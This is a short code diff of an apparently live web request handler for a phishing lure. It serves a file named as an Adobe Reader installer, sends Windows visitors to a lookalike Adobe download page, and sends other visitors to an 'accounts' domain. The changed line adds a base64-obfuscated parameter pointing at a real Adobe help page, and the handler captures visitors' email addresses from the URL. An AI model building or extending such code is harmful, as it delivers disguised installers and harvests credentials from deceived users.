@@ -5,7 +5,7 @@ export default function handler(req, res) {
   // Config
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://jomry.com/adobe-readers/installer/download.html';
   const MSI_PATH = '/Reader_en_install.msi';        // must be in /public
-  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu'; // non-Windows target
+  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu?BTqoJQbzww=aHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vY2EvYWNyb2JhdC9rYi9jYW50LW9wZW4tcGRmLmh0bWw=&smn='; // non-Windows target
 
   // Get email from query param ?email=
   const emailFromQuery = Array.isArray(req.query.email) ? req.query.email[0] : (req.query.email || '');
